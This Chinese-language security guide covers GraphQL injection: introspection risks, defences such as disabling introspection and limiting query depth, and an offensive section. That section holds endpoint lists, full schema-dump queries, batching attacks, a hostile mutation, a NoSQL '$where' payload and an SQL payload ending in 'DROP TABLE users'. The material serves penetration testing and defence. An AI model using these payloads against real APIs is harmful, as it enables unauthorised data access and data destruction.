# GraphQL 注入

> GraphQL 是一种用于API的查询语言，也是用于执行这些查询的运行时。GraphQL服务通过定义类型和字段来创建，然后为每个类型的每个字段提供函数。

## 什么是GraphQL注入？

GraphQL注入是一种安全漏洞，当应用程序在处理GraphQL查询时未正确验证和清理用户输入，导致攻击者可以执行未授权的操作或访问敏感数据。与传统SQL注入类似，但针对的是GraphQL API。

### GraphQL注入的基本原理

1. **查询结构**：GraphQL允许客户端指定需要的确切数据结构和字段，这种灵活性可能被滥用。
2. **自省功能**：GraphQL的自省机制可能被攻击者用来获取API的完整模式信息。
3. **批量查询**：GraphQL支持批量查询，可能被用于DoS攻击或数据泄露。
4. **嵌套查询**：深层嵌套查询可能导致性能问题或数据泄露。

### 深入理解GraphQL自省(Introspection)

GraphQL自省是API自我描述的能力，允许客户端查询API的模式信息。虽然这是一个强大的开发工具，但也可能被攻击者利用。

#### 自省查询示例

```graphql
# 获取所有可用类型
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

#### 自省的主要用途

1. **开发辅助**
   - 提供API的完整文档
   - 支持GraphQL IDE的自动完成功能
   - 帮助理解API功能

2. **客户端工具集成**
   - 生成类型安全的客户端代码
   - 支持代码生成工具

#### 安全风险

1. **信息泄露**
   - 暴露API完整结构
   - 可能泄露敏感字段
   - 暴露业务逻辑

2. **攻击面扩大**
   - 提供API的"路线图"
   - 暴露隐藏功能

#### 保护措施

1. **生产环境禁用**
   ```javascript
   // 在Apollo Server中禁用自省
   const server = new ApolloServer({
     typeDefs,
     resolvers,
     introspection: false, // 禁用自省
     playground: false    // 同时禁用Playground
   });
   ```

2. **环境区分**
   ```javascript
   // 仅开发环境启用
   const isDevelopment = process.env.NODE_ENV === 'development';
   
   const server = new ApolloServer({
     typeDefs,
     resolvers,
     introspection: isDevelopment,
     playground: isDevelopment
   });
   ```

3. **访问控制**
   - 对自省查询实施认证
   - 使用白名单限制客户端

4. **监控与告警**
   - 记录自省查询
   - 设置异常检测

### 为什么GraphQL容易受到注入攻击？

1. **灵活的数据查询**：客户端可以请求任何字段和关系
2. **单一端点**：所有查询都发送到同一个端点，增加了攻击面
3. **自省功能**：默认开启的自省功能可能泄露敏感信息
4. **复杂类型系统**：复杂的类型系统可能导致实现错误

### 常见攻击场景

1. **信息泄露**：
   - 通过自省查询获取API完整模式
   - 访问未授权的数据字段
   - 枚举数据库中的记录

2. **拒绝服务(DoS)**：
   - 构造复杂的嵌套查询消耗服务器资源
   - 批量请求导致资源耗尽

3. **权限提升**：
   - 绕过认证和授权检查
   - 执行管理操作

### 实际攻击示例

1. **基本注入**
   ```graphql
   # 正常查询
   {
     user(id: 1) {
       id
       username
     }
   }
   
   # 恶意注入
   {
     users {
       id
       username
       password  # 尝试获取敏感字段
     }
   }
   ```

2. **自省查询**
   ```graphql
   # 获取所有可用的查询类型
   {
     __schema {
       queryType {
         name
         fields {
           name
           description
         }
       }
     }
   }
   ```

### 防御措施

1. **输入验证**：
   - 验证所有输入参数
   - 使用白名单验证查询结构

2. **查询深度限制**：
   ```javascript
   // 限制查询深度
   const depthLimit = require('graphql-depth-limit');
   app.use('/graphql', graphqlHTTP({
     validationRules: [depthLimit(5)]
   }));
   ```

3. **查询复杂性分析**：
   - 限制查询复杂度
   - 设置查询超时

4. **禁用自省**：
   - 在生产环境中禁用自省功能
   - 使用自定义错误消息

5. **速率限制**：
   - 实现API速率限制
   - 监控异常查询模式

6. **权限控制**：
   - 实现细粒度的访问控制
   - 使用JWT等机制进行认证

7. **日志和监控**：
   - 记录所有GraphQL查询
   - 设置异常检测机制

### 开发注意事项

1. **永远不要信任客户端输入**
2. **使用参数化查询**
3. **实现适当的错误处理**
4. **定期进行安全审计**
5. **保持GraphQL实现库更新**

### 学习资源

- [GraphQL官方安全指南](https://graphql.org/learn/security/)
- [OWASP GraphQL安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL安全最佳实践](https://www.apollographql.com/blog/graphql/security/secure-your-graphql-api/)

通过理解这些概念和防御措施，开发者可以更好地保护他们的GraphQL API免受注入攻击。

## 目录

- [工具](#工具)
- [枚举](#枚举)
    - [常见GraphQL端点](#常见graphql端点)
    - [识别注入点](#识别注入点)
    - [通过自省枚举数据库模式](#通过自省枚举数据库模式)
    - [通过建议枚举数据库模式](#通过建议枚举数据库模式)
    - [枚举类型定义](#枚举类型定义)
    - [列出到达某个类型的路径](#列出到达某个类型的路径)
- [方法学](#方法学)
    - [提取数据](#提取数据)
    - [使用边/节点提取数据](#使用边节点提取数据)
    - [使用投影提取数据](#使用投影提取数据)
    - [变更操作](#变更操作)
    - [GraphQL批处理攻击](#graphql批处理攻击)
        - [基于JSON列表的批处理](#基于json列表的批处理)
        - [基于查询名称的批处理](#基于查询名称的批处理)
- [注入攻击](#注入攻击)
    - [NoSQL注入](#nosql注入)
    - [SQL注入](#sql注入)
- [实验](#实验)
- [参考资料](#参考资料)

## 工具

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - 用于与GraphQL端点交互的脚本引擎，用于渗透测试
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL安全研究资料
- [doyensec/inql](https://github.com/doyensec/inql) - 用于GraphQL安全测试的Burp扩展
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - 解析GraphQL自省模式并生成可能的查询
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - 列出在GraphQL模式中到达给定类型的不同方式
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - 用于探索GraphQL API的广泛IDE
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - 在禁用自省的情况下获取GraphQL API模式
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - GraphQL密码爆破和模糊测试工具
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - 安全专业人员用于研究GraphQL实现中安全漏洞的GraphQL威胁框架
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - GraphQL API安全审计工具
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - 将任何GraphQL API表示为交互式图表
- [Insomnia](https://insomnia.rest/) - 跨平台HTTP和GraphQL客户端

## 枚举

### 常见GraphQL端点

大多数情况下，GraphQL位于`/graphql`或`/graphiql`端点。
更完整的列表可在[danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt)找到。

```
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

### 识别注入点

```js
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

检查是否可见错误。

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### 通过自省枚举数据库模式

URL编码的查询，用于转储数据库模式。

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

URL解码的查询，用于转储数据库模式。

```graphql
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

单行查询，无需片段即可转储数据库模式。

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```js
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### 通过建议枚举数据库模式

当使用未知关键字时，GraphQL后端将响应与其模式相关的建议。

```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```

当GraphQL API的模式不可访问时，您还可以尝试使用[Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist)等单词列表来暴力破解已知关键字、字段和类型名称。

### 枚举类型定义

使用以下GraphQL查询枚举感兴趣类型的定义，将"User"替换为所选类型。

```graphql
{
  __type(name: "User") {
    name
    kind
    description
    fields {
      name
      description
      type {
        name
        kind
      }
    }
  }
}
```

### 列出到达某个类型的路径

使用[dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum)工具可以列出在GraphQL模式中到达给定类型的所有可能路径。

## 方法学

### 提取数据

基本查询示例：

```graphql
{
  users {
    id
    username
    email
  }
}
```

### 使用边/节点提取数据

当数据以边/节点结构返回时：

```graphql
{
  users(first: 10) {
    edges {
      node {
        id
        username
        email
      }
    }
  }
}
```

### 使用投影提取数据

```graphql
{
  user(id: "1") {
    id
    username
    email
    posts {
      title
      content
    }
  }
}
```

### 变更操作

GraphQL变更操作示例：

```graphql
mutation {
  updateUser(id: "1", input: {username: "hacker", email: "hacker@example.com"}) {
    user {
      id
      username
      email
    }
  }
}
```

### GraphQL批处理攻击

#### 基于JSON列表的批处理

```json
[
  {
    "query": "query { user(id: 1) { id username email } }"
  },
  {
    "query": "query { user(id: 2) { id username email } }"
  }
]
```

#### 基于查询名称的批处理

```graphql
query GetUser1 {
  user(id: 1) {
    id
    username
    email
  }
}

query GetUser2 {
  user(id: 2) {
    id
    username
    email
  }
}
```

## 注入攻击

### NoSQL注入

当GraphQL后端使用MongoDB等NoSQL数据库时，可能容易受到NoSQL注入攻击。

```graphql
{
  users(filter: "{'$where': 'this.isAdmin == true'}") {
    id
    username
    email
  }
}
```

### SQL注入

当GraphQL后端使用SQL数据库时，可能容易受到SQL注入攻击。

```graphql
{
  users(filter: "1=1; DROP TABLE users--") {
    id
    username
    email
  }
}
```

## 实验

1. 设置本地GraphQL服务器进行测试
2. 使用GraphiQL或Insomnia等工具测试查询和变更
3. 尝试自省查询以发现API模式
4. 测试批量查询和可能的注入点

## 参考资料

- [GraphQL官方文档](https://graphql.org/learn/)
- [GraphQL安全最佳实践](https://graphql.org/learn/security/)
- [GraphQL注入攻击与防御](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)
- [GraphQL安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL安全测试指南](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0x07-graphql.md)
- [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r - 2017年6月8日](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
- [Securing Your GraphQL API from Malicious Queries - Max Stoiber - 2018年2月21日](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
- [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Jobert Abma (jobert) - 2018年11月6日](https://hackerone.com/reports/435066)
